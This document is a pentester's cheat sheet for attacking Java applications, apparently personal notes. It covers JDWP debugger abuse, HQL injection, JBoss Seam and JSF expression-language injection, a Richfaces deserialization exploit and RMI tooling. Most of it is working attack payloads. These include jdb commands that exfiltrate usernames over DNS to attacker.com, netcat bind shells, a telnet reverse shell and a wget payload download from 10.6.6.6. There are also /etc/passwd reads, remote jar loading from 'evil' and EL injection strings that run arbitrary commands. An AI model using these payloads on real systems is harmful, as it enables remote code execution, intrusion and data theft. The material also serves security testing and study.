# java

# decompiler / editor / debugger
http://www.javadecompilers.com/
https://github.com/Storyyeller/Krakatau
https://github.com/Konloch/bytecode-viewer.git
http://jode.sourceforge.net/

# coverity source code java audit
https://code-spotter.com/

# JDK_HOME JAVA_HOME
/usr/lib/jvm/oracle-jdk-1.7.0_13

# download old versions from archive
http://www.oracle.com/technetwork/java/javase/archive-139210.html

# java class file version
major  minor Java platform version 
45       3           1.0
45       3           1.1
46       0           1.2
47       0           1.3
48       0           1.4
49       0           1.5
50       0           1.6

# hibernate
http://blog.h3xstream.com/2014/02/hql-for-pentesters.html
http://0ang3el.blogspot.com.au/2015/12/zeronights-0x05.html
http://static.sstic.org/rumps2015/SSTIC_2015-06-04_P12_RUMPS_09_Factorisation.{mp4,pdf}
\'' (MySQL)
' -- ' (https://twitter.com/_unread_/status/609311174170181632)
$$'' (Oracle/H2 https://twitter.com/Agarri_FR/status/609523917875752960)

* getTemplate().find("FROM ..." + url_param1)
vuln but you can't make subqueries

* getSession().createSQLQuery("select * from blah where id = " + url_param1) or createQuery (to confirm)
vuln and you can make subqueries

# system properties
System.getProperties().list(System.out);

# jdwp
http://seclists.org/nmap-dev/2010/q1/867
https://github.com/schierlm/JavaPayload/ (http://schierlm.users.sourceforge.net/JavaPayload/)
https://gist.github.com/hugsy/7868799
http://www.hsc-news.com/archives/2013/000109.html LSV
https://github.com/rapid7/metasploit-framework/pull/3407 msf/java_jdwp_debugger

java -Xrunjdwp:server=y,transport=dt_socket,address=4000,suspend=n -cp . HelloWorld
or
java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1234 -cp . HelloWorld

port is random if address= not specified

jdwp-shellifier massscan ports: 8000,8787,8788,9009,7777,8453,5005,3999,5000,18000,9001

Developer | Product                       Default TCP port  Version
----------+--------------------------------------------------------
Apache    | Tomcat                        *:8000            7.0.52
Apache    | Tomcat                        localhost:8000    8.0.3
Red Hat   | JBoss EAP                     *:8787            6.2.0
Red Hat   | JBoss AS                      *:8787            7.1.1
Red Hat   | JBoss WildFly                 *:8787,*:8788     8.0.0
Oracle    | GlassFish                     *:9009            4.0
IBM       | WebSphere Application Server  *:7777            8.5.5
Oracle    | Oracle WebLogic Server        *:8453            12c
          | Filemaker                     *:3999            <v12

* jdb -attach <ip:port>
ce qui marche vraiment 
threads
thread 0x1
where
thread 0x2
where
pick a function that is not called by too many threads and place a breakpoint on it with "stop in"

jdb -attach 192.168.111.208:7000
> help
> version
> classpath
> trace go methods
> untrace

> threads
> thread 0x1
> suspend 0x1
> where
> class|methods|fields javaapplication6.JavaApplication6
> resume

> stop in javaapplication6.JavaApplication6.main
Breakpoint hit: "thread=main", javaapplication6.JavaApplication6.main(), line=19 bci=0

main[1] print new java.lang.String("Blah").length()
 new java.lang.String("Blah").length() = 4

main[1] print java.lang.System.getProperty("user.name")
 java.lang.System.getProperty("user.name") = "Administrator"

print new java.lang.Runtime().exec("dig hello.d2t.attacker.com")
print new java.lang.Runtime().exec("curl http://attacker.com/hello")

- ProcessBuilder may not be listed in classes, but try use it anyway
- ProcessBuilder may not be available if not loaded by the JVM, I would get error "No class named: java.lang.ProcessBuilder" (ie. nobody does import java.lang.ProcessBuilder).
- java.util.Arrays.asList might not be avail depending on java version, use "".split("_") instead
print new java.lang.ProcessBuilder(java.util.Arrays.asList("/bin/sh", "-c", "dig yes.d2t.attacker.com")).start() OK
print new java.lang.ProcessBuilder(java.util.Arrays.asList("/bin/sh", "-c", "dig $USER.asdf.d2t.attacker.com")).start() OK fmserver
print new java.lang.ProcessBuilder(java.util.Arrays.asList("/bin/sh", "-c", "dig uid$UID.asdf.d2t.attacker.com")).start() OK 502
print new java.lang.ProcessBuilder(java.util.Arrays.asList("/bin/sh", "-c", "nc -vlnp 3999 < /tmp/.f|/bin/sh > /tmp/.f 2>&1")).start()

- inband
print new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.ProcessBuilder(java.util.Arrays.asList("bash","-c","cat /etc/passwd|tr \\n @")).start().getInputStream(),"UTF-8"),1000000).readLine()
print new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.ProcessBuilder(java.util.Arrays.asList("bash","-c","cat /etc/passwd|gzip -f|base64 -w0")).start().getInputStream())).readLine()
openssl base64

- bind shell
print new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.ProcessBuilder(java.util.Arrays.asList("bash","-c","mkfifo /tmp/.f")).start().getInputStream())).readLine()
print new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.ProcessBuilder(java.util.Arrays.asList("bash","-c","nc -l 4000 < /tmp/.f|sh > /tmp/.f 2>&1")).start().getInputStream())).readLine()

- reverse shell
print new java.lang.Runtime().exec("/usr/sfw/bin/wget -O /home/wasusr/.t.sh http://10.6.6.6:8080/demo/.t.sh")
print new java.lang.ProcessBuilder(java.util.Arrays.asList("/bin/sh", "-c", "telnet 10.6.6.6 8888 | /bin/sh | telnet 10.6.6.6 9999")).start()

- Runtime instead of ProcessBuilder 
print new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("cat /etc/passwd").getInputStream())).readLine()
print new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("cat /etc/passwd").getInputStream())).skip(32).readLine()
print new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("bashXX-cXXuname -a 2>&1".split("XX")).getInputStream())).readLine()

print new java.lang.Runtime().exec("bash -c id>/tmp/id.txt")
print new java.lang.Runtime.getRuntime().exec("bash_-c_uname -a>/tmp/uname.txt".split("_"))
print new java.io.BufferedReader(new java.io.FileReader("/tmp/uname.txt")).readLine()

print new java.io.FileWriter("/tmp/b.txt").append("asdf asdfasdfasdf asdf@asdf").flush()

# dymanic code execution using class loader
http://www.hsc-news.com/archives/2010/000074.html LSV

  try{
    /* Construction des URL où chercher */
    URL[] classUrls = {
      new URL("http://evil/remote.jar")
    };

    /* Instanciation du classloader avec les URL */
    URLClassLoader urlLoader = new URLClassLoader(classUrls);

    /* Chargement et instanciation de la classe malveillante */
    Class cls = urlLoader.loadClass("hsc.Remote");
    Object malicious = cls.newInstance();

    /* Invocation de la méthode malveillante */
    Method maliciousMethod = cls.getMethod("print");
    System.out.println(maliciousMethod.invoke(malicious));
  } catch(Exception e) {
    e.printStackTrace();
  }

Le code malveillant n'est plus présent ni dans l'application ni dans une
bibliothèque du classpath et réalise pourtant des opérations potentiellement
malveillantes : 

  package hsc;
  
  import java.io.*;
  
  public class Remote {
    public String print() {
      Process proc;
      BufferedReader output;
      StringBuilder result = new StringBuilder();
      String[] cmdArray = {"/bin/bash", "-c", "id"};
  
      try {
        proc = Runtime.getRuntime().exec(cmdArray);
        output = new BufferedReader(
          new InputStreamReader(proc.getInputStream())
        );
    
        char buffer[] = new char[8192];
        int lenRead;
    
        while ((lenRead = output.read(buffer, 0, buffer.length)) > 0) {
          for (int i = 0; i < lenRead; i++) {
            result.append(buffer[i]);
          }
        }   
      } catch (Exception e) {
        e.printStackTrace();
      }   
      
      return result.toString(); 
  
    }
  }

# jsf - Java Server Faces
* decode viewstate
https://github.com/SpiderLabs/deface.git (https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2010-001/?fid=3765)

* oracle padding decryption
POET
Inyourface

# jboss seam / jsf
* expression language injection via remote inclusion
<body>
<p>${"".getClass().forName('java.lang.Runtime').getDeclaredMethods()[14].invoke("".getClass().forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null), param.test)}</p>
</body>
http://docs.oracle.com/javaee/6/tutorial/doc/gjddd.html used by the JSF framework

* EL injection via actionOutcome (CVE-2010-1871)
http://blog.o0o.nu/2010/07/cve-2010-1871-jboss-seam-framework.html https://bugzilla.redhat.com/show_bug.cgi?id=615956 http://www.cvedetails.com/cve/CVE-2010-1871/

test: GET /vuln/home.seam?actionOutcome=/pwn.xhtml%3fpwned%3d%23{expressions.getClass().forName('java.lang.Runtime')}
vuln: Location: /vuln/pwn.seam?pwned=class+java.lang.Runtime
fix: developers blacklisted # and { characters in actionOutcome, but can be bypassed via actionMethod + double EL injection

* actionMethod + double EL injection
someone hinted it would be possible back in 2010 http://blog.o0o.nu/2010/07/cve-2010-1871-jboss-seam-framework.html?showComment=1285586160417#c3222807404834356400
the bypass 0day was exploited during hitcon-ctf-quals-2016 Angry Seam

update user description to: /?a=#{expressions.instance().createValueExpression(request.getQueryString()).getValue()}
then access /angryseam/template.seam?x=#{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),request.getHeader('Cmd'))}&actionMethod=template.xhtml:util.escape(sessionScope['user'].getDescription()) + send header Cmd: ping blah

1st condition: need a page that will eval actionMethod=
2nd condition: need another page to store our first EL

https://github.com/seam2/jboss-seam/blob/f3077fee9d04b2b3545628cd9e6b58c859feb988/jboss-seam/src/main/java/org/jboss/seam/navigation/Pages.java#L674
line 708 is the first evaluation and line 710 will evaluate again

forever vuln because not maintained anymore: https://github.com/seam2/jboss-seam/commit/965d4f3ea4dd527a41402f4758878de02d5ede7d

* CVE-2013-2165 java deserialization in Richfaces 3.3.3Final // http://vnprogramming.com/index.php/2016/10/10/web500-hitconctf-2016-and-exploit-cve-2013-2165/
vuln: in richfaces-impl-3.3.3.Final.jar:org.ajax4jsf.resource.ResourceBuilderImpl.class
test: GET /jboss-seam-jpa/a4j/g/3_3_3.Finalorg/richfaces/renderkit/html/scripts/skinning.js (jpa is an example app in Jboss seam 2.2.1Final
exploit: http://localhost:8082/jboss-seam-jpa/a4j/g/3_3_3.Finalorg/richfaces/renderkit/html/scripts/skinning.js/DATA/xxxxxxxxx
Tomcat (or JBoss) detects prefix /a4j and routes request to Richfaces
Richfaces uses ResourceBuilderImple to parse g/3_3_3.Finalorg/richfaces/renderkit/html/scripts/skinning.js/DATA/xxxxxxxxx
skips g/3.3.3.Final and grabs resource path org/richfaces/renderkit/html/scripts/skinning.js as well as descompress+deserialize the xxxxxxxxx after DATA/
use ysoserial and compress+base64 encode to generate xxxxxxxxx

# JSP Expression Language
JSP EL is a specification, there are many implementations (e.g. OGNL in struts2/webwork, Spring SpEL, JBoss EL, MVEL)
only since the JSP 2.0 specification has EL been available within JSP pages directly
however, it can and has been used in non-view use cases
https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf
http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/
can be turned off since Spring 3.0.6 and above by setting the springJspExpressionSupport context parameter to false in web.xml
turned off by default since Spring Framework 3.1 onwards when running on Servlet 3.0 or higher

# jnlp
download jar files from a jnlp file: https://code.google.com/p/jnlpdownloader/

# rmi
https://www.makeuseof.com/tag/java-rmi-registry/
http://www.accuvant.com/blog/exploiting-jmx-rmi
https://github.com/mogwaisec/mjet
https://labs.portcullis.co.uk/tools/rmiinfo/
also see msf and nmap exploits

# jd-gui
find -type f -print0 | xargs -0 sed -i -e 's,^[[:space:]]*/\*[^*]\+\*/ ,,'

# java all the vulns
https://bitbucket.org/ilmila/j2eescan/

# deserialization
https://github.com/NickstaDB/SerializationDumper # dump and rebuild serialization streams and RMI packet contents in a more human readable form
http://blog.cr0.org/2009/05/write-once-own-everyone.html
http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
https://tersesystems.com/2015/11/08/closing-the-open-door-of-java-object-serialization/
https://github.com/federicodotta/Java-Deserialization-Scanner (scanner for burp)
https://github.com/njfox/Java-Deserialization-Exploit
https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet (reference *)

# jrun
rce if http://1.2.3.4/a;.jsp or /a%253bjsp gives a 404 error by Jrun instead of Apache

# jsp
http://www.owasp.org/index.php?title=Category:OWASP_JSP_Testing_Tool_Project

# groovy
java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("hehe").getText()
